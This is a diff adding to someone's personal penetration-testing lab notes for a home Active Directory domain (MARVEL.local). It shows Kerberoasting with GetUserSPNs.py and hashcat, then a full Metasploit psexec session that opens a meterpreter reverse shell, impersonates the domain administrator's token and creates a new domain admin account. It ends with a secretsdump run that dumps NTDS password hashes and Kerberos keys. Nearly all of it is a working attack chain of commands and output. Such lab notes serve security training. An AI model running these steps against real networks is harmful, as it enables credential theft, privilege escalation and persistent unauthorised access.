@@ -952,3 +952,407 @@ NL$KM:214845bb9c6698625b1e1fc156aba43bdc0414535837001c3d3e258d5853c629ae5b1f32e0
 [*] Restoring the disabled state for service RemoteRegistry
 
 ```
+
+
+## Kerberoasting
+
+![image.png](attachment:818d94f1-aaca-41c3-ba5d-b7aaf40c11cf:image.png)
+
+Kerberos is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.
+
+```bash
+└─$ sudo python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 192.168.126.131 -request
+
+```
+
+Imagine that works i messed up setting up the AD
+
+copy hashes 
+
+```bash
+		hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
+```
+
+![image.png](attachment:67f882dd-8baf-464f-b980-dd146568501e:image.png)
+
+## Token Impersonation
+
+```bash
+                                                                                                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/pjpt]
+└─$ msfconsole
+Metasploit tip: Metasploit can be configured at startup, see msfconsole 
+--help to learn more
+                                                  
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
+
+       =[ metasploit v6.4.50-dev                          ]
++ -- --=[ 2495 exploits - 1283 auxiliary - 393 post       ]
++ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search psexec
+
+Matching Modules
+================
+
+   #   Name                                         Disclosure Date  Rank       Check  Description
+   -   ----                                         ---------------  ----       -----  -----------
+   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
+   1   exploit/windows/smb/smb_relay                2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
+   2     \_ action: CREATE_SMB_SESSION              .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
+   3     \_ action: PSEXEC                          .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
+   4     \_ target: Automatic                       .                .          .      .
+   5     \_ target: PowerShell                      .                .          .      .
+   6     \_ target: Native upload                   .                .          .      .
+   7     \_ target: MOF upload                      .                .          .      .
+   8     \_ target: Command                         .                .          .      .
+   9   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   10    \_ target: Automatic                       .                .          .      .
+   11    \_ target: PowerShell                      .                .          .      .
+   12    \_ target: Native upload                   .                .          .      .
+   13    \_ target: MOF upload                      .                .          .      .
+   14    \_ AKA: ETERNALSYNERGY                     .                .          .      .
+   15    \_ AKA: ETERNALROMANCE                     .                .          .      .
+   16    \_ AKA: ETERNALCHAMPION                    .                .          .      .
+   17    \_ AKA: ETERNALBLUE                        .                .          .      .
+   18  auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   19    \_ AKA: ETERNALSYNERGY                     .                .          .      .
+   20    \_ AKA: ETERNALROMANCE                     .                .          .      .
+   21    \_ AKA: ETERNALCHAMPION                    .                .          .      .
+   22    \_ AKA: ETERNALBLUE                        .                .          .      .
+   23  auxiliary/scanner/smb/psexec_loggedin_users  .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
+   24  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
+   25    \_ target: Automatic                       .                .          .      .
+   26    \_ target: PowerShell                      .                .          .      .
+   27    \_ target: Native upload                   .                .          .      .
+   28    \_ target: MOF upload                      .                .          .      .
+   29    \_ target: Command                         .                .          .      .
+   30  auxiliary/admin/smb/psexec_ntdsgrab          .                normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
+   31  exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
+   32  encoder/x86/service                          .                manual     No     Register Service
+   33  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
+   34  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
+   35    \_ target: Automatic                       .                .          .      .
+   36    \_ target: Native upload                   .                .          .      .
+   37  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
+
+Interact with a module by name or index. For example info 37, use 37 or use exploit/windows/local/wmi
+
+msf6 > use 24
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+msf6 exploit(windows/smb/psexec) > options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+
+   Used when connecting via an existing SESSION:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   no        The session to run this module on
+
+   Used when making a new connection via RHOSTS:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      445              no        The target port (TCP)
+   SMBDomain  .                no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.126.130  yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/psexec) > set RHOST 192.168.126.132
+RHOST => 192.168.126.132
+msf6 exploit(windows/smb/psexec) > set SMBUSER fcastle
+SMBUSER => fcastle
+msf6 exploit(windows/smb/psexec) > set SMBPASS Password1
+SMBPASS => Password1
+msf6 exploit(windows/smb/psexec) > set SMBD
+set SMBDIRECT  set SMBDOMAIN  
+msf6 exploit(windows/smb/psexec) > set SMBDOMAIN MARVEL.local
+SMBDOMAIN => MARVEL.local
+msf6 exploit(windows/smb/psexec) > run
+[*] Started reverse TCP handler on 192.168.126.130:4444 
+[*] 192.168.126.132:445 - Connecting to the server...
+[*] 192.168.126.132:445 - Authenticating to 192.168.126.132:445|MARVEL.local as user 'fcastle'...
+[*] 192.168.126.132:445 - Selecting PowerShell target
+[*] 192.168.126.132:445 - Executing the payload...
+[-] 192.168.126.132:445 - Service failed to start - ACCESS_DENIED
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/psexec) > run
+[*] Started reverse TCP handler on 192.168.126.130:4444 
+[*] 192.168.126.132:445 - Connecting to the server...
+[*] 192.168.126.132:445 - Authenticating to 192.168.126.132:445|MARVEL.local as user 'fcastle'...
+[*] 192.168.126.132:445 - Selecting PowerShell target
+[*] 192.168.126.132:445 - Executing the payload...
+[-] 192.168.126.132:445 - Service failed to start - ACCESS_DENIED
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/psexec) > run
+[*] Started reverse TCP handler on 192.168.126.130:4444 
+[*] 192.168.126.132:445 - Connecting to the server...
+[*] 192.168.126.132:445 - Authenticating to 192.168.126.132:445|MARVEL.local as user 'fcastle'...
+[*] 192.168.126.132:445 - Selecting PowerShell target
+[*] 192.168.126.132:445 - Executing the payload...
+[+] 192.168.126.132:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (203846 bytes) to 192.168.126.132
+[*] Meterpreter session 1 opened (192.168.126.130:4444 -> 192.168.126.132:53945) at 2025-04-18 00:57:21 -0400
+
+meterpreter > shell
+Process 7760 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.19045.2006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>^C
+Terminate channel 1? [y/N]  y
+meterpreter > load incognito
+Loading extension incognito...Success.
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+Font Driver Host\UMFD-2
+MARVEL\Administrator
+MARVEL\fcastle
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+Window Manager\DWM-1
+Window Manager\DWM-2
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+meterpreter > impersonate_token marvel\\fcastle
+[+] Delegation token available
+[+] Successfully impersonated user MARVEL\fcastle
+meterpreter > shell
+Process 5728 created.
+Channel 2 created.
+Microsoft Windows [Version 10.0.19045.2006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+marvel\fcastle
+
+C:\Windows\system32>^C
+Terminate channel 2? [y/N]  y
+meterpreter > rev2self
+meterpreter > get uid
+[-] Unknown command: get. Did you mean getwd? Run the help command for more details.
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+MARVEL\Administrator
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+Window Manager\DWM-1
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+meterpreter > impersonate_token MARVEL\\Administrator
+[+] Delegation token available
+[+] Successfully impersonated user MARVEL\Administrator
+meterpreter > shell
+Process 7188 created.
+Channel 3 created.
+Microsoft Windows [Version 10.0.19045.2006]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+marvel\administrator
+
+C:\Windows\system32>net user /add hawkeye Password1@ /domain
+net user /add hawkeye Password1@ /domain
+The request will be processed at a domain controller for domain MARVEL.local.
+
+The command completed successfully.
+
+C:\Windows\system32>net group "Domain Admins" hawkeye /ADD /DOMAIN
+net group "Domain Admins" hawkeye /ADD /DOMAIN
+The request will be processed at a domain controller for domain MARVEL.local.
+
+The command completed successfully.
+
+```
+
+Validating it works
+
+```bash
+└─$ python3 /home/kali/.local/bin/secretsdump.py MARVEL.local/hawkeye:'Password1@'@192.168.126.131
+
+Impacket v0.13.0.dev0+20250415.195618.c384b5f - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x87e9962376bee6276c9c80bd6ca9fdef
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+MARVEL\HYDRA-DC$:aes256-cts-hmac-sha1-96:d2ed88d44321631bf89feb7df4cd4b536813d77c78ba25234c257b125fc70dfe
+MARVEL\HYDRA-DC$:aes128-cts-hmac-sha1-96:28e18457f18b42042ed835177e4deddd
+MARVEL\HYDRA-DC$:des-cbc-md5:4a6e044386a41cd9
+MARVEL\HYDRA-DC$:plain_password_hex:5fb20bf910043ba31e7803bf69c9a8188dd3180802ef12ab282266eec4b41bb2f8268d1f4d424366c018b787a7446b209196f0fc37061904c2b4d38151db9e02ad08590ba3a275075ac0d5766e2ff9c0063f3c5a7a09e3cc013210effc46458dc226b7e12397222ee24ce53c12f1c492e8b0fb278507bfc5c02f3eb71da3cc19b4db0a266d9a60bfbde741b16e292daf9fa9208d3621d80fa320916f8723daa225b5cce8eaf29c73d08a2bf4d168a4af6c6d9037b7f6d158bdf23feb68fadd7f5ed6d637336a76f17a5eed9ffe8aaaa152c1374e9792a274d92bea4604a8ee927cb8ad8e4b9e1309d332d269784fdcff
+MARVEL\HYDRA-DC$:aad3b435b51404eeaad3b435b51404ee:10ea909cc2f3d5fd9ff58aab67981c80:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x97ae1d1b3ebda7255c0aadf36bbbfd49688526e7
+dpapi_userkey:0x1d86e04297a54ae6bed75374a262e8b56615b766
+[*] NL$KM 
+ 0000   E1 C2 25 00 90 67 B0 1A  63 7A 74 0C FD A5 7E 56   ..%..g..czt...~V
+ 0010   4D 93 73 6A 47 92 07 8D  6E 1D E3 B1 10 92 1C BC   M.sjG...n.......
+ 0020   C4 10 A9 35 C1 C7 1D 02  FF E9 3F 37 2C F5 8F F8   ...5......?7,...
+ 0030   A1 1E 2E A0 8B 56 33 27  F5 B8 04 B6 5D 86 70 B4   .....V3'....].p.
+NL$KM:e1c225009067b01a637a740cfda57e564d93736a4792078d6e1de3b110921cbcc410a935c1c71d02ffe93f372cf58ff8a11e2ea08b563327f5b804b65d8670b4
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1bb8e66d067c3f9c7c42d72c0ec3e768:::
+MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
+MARVEL.local\SQL Service:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
+MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+hawkeye:1109:aad3b435b51404eeaad3b435b51404ee:43460d636f269c709b20049cee36ae7a:::
+HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:10ea909cc2f3d5fd9ff58aab67981c80:::
+FRANKCASTLE$:1107:aad3b435b51404eeaad3b435b51404ee:129ed04a1eeb1e35888c0d2ebf69ec18:::
+SPIDERMAN$:1108:aad3b435b51404eeaad3b435b51404ee:23e58192bce5f41ef46ebb67d5ae578d:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:7b2a8311c2f4b545f65cab444f5dd5edc12f7b5e7a11911362d129821d961bf3
+Administrator:aes128-cts-hmac-sha1-96:afa6adf45cb9fa242b685e26a6aa65b6
+Administrator:des-cbc-md5:83548cd964c2a49e
+krbtgt:aes256-cts-hmac-sha1-96:01d272bc05622af7773319f5b83f21ada4f256a98e692e540b942175e6c129e8
+krbtgt:aes128-cts-hmac-sha1-96:b8500bbc7bfc70f3c900c4fdcc6cec26
+krbtgt:des-cbc-md5:5b4975bf9bd09220
+MARVEL.local\tstark:aes256-cts-hmac-sha1-96:c0253feb8fa1a0532844adabe1db7b12a0e9c2e12b84d6640ed886025c175b50
+MARVEL.local\tstark:aes128-cts-hmac-sha1-96:68727fb995192f9766d6294ffd64080c
+MARVEL.local\tstark:des-cbc-md5:f2253d9e1373adcd
+MARVEL.local\SQL Service:aes256-cts-hmac-sha1-96:85c7a4e514f4c892eb31967428ba18dcf9b449d1c24991cbe82432ac0f7916a9
+MARVEL.local\SQL Service:aes128-cts-hmac-sha1-96:af7bda1d251a8d4fb369f7166c72e4e1
+MARVEL.local\SQL Service:des-cbc-md5:466d67c21cb0ad9b
+MARVEL.local\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409
+MARVEL.local\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9
+MARVEL.local\fcastle:des-cbc-md5:4fa7ad454cc78954
+MARVEL.local\pparker:aes256-cts-hmac-sha1-96:906e23c09d876f3238f3ff8f2c247388ab36f7bc744cfbd4cb2b8f5a14e8914f
+MARVEL.local\pparker:aes128-cts-hmac-sha1-96:339d007f3b450b6233607587d7ee0103
+MARVEL.local\pparker:des-cbc-md5:61756889adfb4c29
+hawkeye:aes256-cts-hmac-sha1-96:70306b40ac0b9da21903551fa70b3191b61d88749e356b11cbe93721a0d3b471
+hawkeye:aes128-cts-hmac-sha1-96:2ee48035a17365b1951d8a8105c917e4
+hawkeye:des-cbc-md5:01f758f731b6757c
+HYDRA-DC$:aes256-cts-hmac-sha1-96:d2ed88d44321631bf89feb7df4cd4b536813d77c78ba25234c257b125fc70dfe
+HYDRA-DC$:aes128-cts-hmac-sha1-96:28e18457f18b42042ed835177e4deddd
+HYDRA-DC$:des-cbc-md5:40929e25ad6b984c
+FRANKCASTLE$:aes256-cts-hmac-sha1-96:7e3d22a46a557c3521375bd5a23215ad591220b6fbcc7bac2be9483d9fa50df2
+FRANKCASTLE$:aes128-cts-hmac-sha1-96:c2bc87d174eb2a812a5812a8df8fe62a
+FRANKCASTLE$:des-cbc-md5:5ebf13ead3dcd0ad
+SPIDERMAN$:aes256-cts-hmac-sha1-96:51d31293b79109b275b96310b36953cf7843a19d6ec043e9f62bc386d6f95b2a
+SPIDERMAN$:aes128-cts-hmac-sha1-96:1c0e440743dd60e3030c42b7cdddf0d2
+SPIDERMAN$:des-cbc-md5:40cb61c4e05ecd6e
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+Exception ignored in: <function Registry.__del__ at 0x7f94bc289440>
+Traceback (most recent call last):
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/winregistry.py", line 185, in __del__
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/winregistry.py", line 182, in close
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 360, in close
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smbconnection.py", line 605, in closeFile
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 1357, in close
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 474, in sendSMB
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 443, in signSMB
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/crypto.py", line 150, in AES_CMAC
+  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
+KeyError: 'Cryptodome.Cipher.AES'
+Exception ignored in: <function Registry.__del__ at 0x7f94bc289440>
+Traceback (most recent call last):
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/winregistry.py", line 185, in __del__
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/winregistry.py", line 182, in close
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 360, in close
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smbconnection.py", line 605, in closeFile
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 1357, in close
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 474, in sendSMB
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/smb3.py", line 443, in signSMB
+  File "/home/kali/.local/lib/python3.13/site-packages/impacket/crypto.py", line 150, in AES_CMAC
+  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
+KeyError: 'Cryptodome.Cipher.AES'
+
+```
